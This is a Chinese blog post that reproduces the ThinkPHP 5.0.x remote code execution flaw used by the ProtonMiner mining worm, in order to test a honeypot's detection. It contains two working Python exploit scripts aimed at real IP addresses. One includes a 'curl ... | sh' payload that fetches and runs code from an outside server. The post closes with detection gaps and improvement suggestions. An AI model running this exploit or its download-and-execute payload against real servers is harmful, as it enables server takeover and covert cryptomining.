---
title: "ThinkPHP RCE远程执行漏洞"
description: "ThinkPHP RCE远程执行漏洞"
tags: ["Vulhub"]
ShowReadingTime: true
ShowShareButtons: false
ShowPostNavLinks: true
ShowBreadCrumbs: true
ShowCodeCopyButtons: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
disableSpecial1stPost: false
disableScrollToTop: false
comments: false
hidemeta: false
hideSummary: false
showtoc: true
tocopen: true
---
- 唐榕 - 2022-09-02 17:30

# 一、事件概述

近日，阿里云安全监测到一种挖矿蠕虫，正在互联网上加速传播。阿里云安全根据它使用ProtonMail邮箱地址作为矿池用户名的行为，将其命名为ProtonMiner。其中，ProtonMiner利用了远程RCE漏洞攻击手段，攻击了ThinkPHP服务，将然后利用受害者主机进行挖矿。(报告链接: [https://www.freebuf.com/vuls/197202.html](https://www.freebuf.com/vuls/197202.html))

# 二、POC获取及复现

## 1、POC获取

```python
import requests

def Poc(url:str,param : str):
    bug = "index.php?s=captcha"
    bug_data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": param}
    res = requests.post(url + bug,  data=bug_data)
    if(res.status_code==200):
        return res.text
    return 'error'

payload = 'echo "ZWNobyAiaGVsbG93b3JkIg==" | base64 -d |sh'
ret = Poc('http://112.74.112.192:80/',payload) #执行echo "hellword"
print(ret)
if "helloword" in ret: 
    print("ThinkPHP5 5.0.23 远程代码执行漏洞存在")
```

## 2、根据真实攻击修改POC

### 2.1、样本漏洞利用分析

样本(359e7272c933c710476955508d687ad3)通过使用ThinkPHP5.0~5.0.23 RCE漏洞进行恶意攻击。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId5.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId5.png)

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId6.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId6.png)

### 2.2、修改POC

将命令`echo "helloword"`写入test.txt后上传至服务器，构造以下payload。

`payload = curl -fsSL hxxp://118.195.186.174/public/test.txt | sh`

```python
import requests

def Poc(url:str,param : str):
    bug = "index.php?s=captcha"
    bug_data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": param}
    res = requests.post(url + bug,  data=bug_data)
    if(res.status_code==200):
        return res.text
    return 'error'

payload = 'curl http://118.195.186.174/public/test.txt | sh'
ret = Poc('http://8.210.158.131/',payload)
print(ret); #输出执行结果
```

# 3、在蜜罐中复现过程

本次复现使用的蜜罐地址为：[https://47.115.125.75/](https://47.115.125.75/)。首先启动对应的蜜罐服务。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId8.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId8.png)

地址栏输入IP后访问正常。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId9.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId9.png)

首先本机访问地址`hxxp://118.195.186.174/public/test.txt`查看内容是否正常。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId10.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId10.png)

执行新构造的POC。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId11.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId11.png)

成功执行命令后进入蜜罐查看威胁事件，蜜罐能够成功捕获到行为但威胁行为不明确且缺失了外联获取测试样本的行为。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId12.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId12.png)

在捕获到的Pcap包中也能看到POC使用的payload和执行后的结果

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId13.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId13.png)

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId14.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId14.png)

但在样本列表中并没有捕获到payload所外联的测试文件test.txt。

![/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId15.png](/posts/Vulhub/ThinkPHP%20RCE远程执行漏洞/document_image_rId15.png)

# 三、复现结果及建议

复现结果：蜜罐未能准确报出威胁行为为漏洞利用、未检测出下载测试样本外联行为、未捕获到payload所外联的测试样本

优化建议：增加自动对payload中访问C2文件的捕获能力、增强对外联行为和漏洞利用行为的检测能力。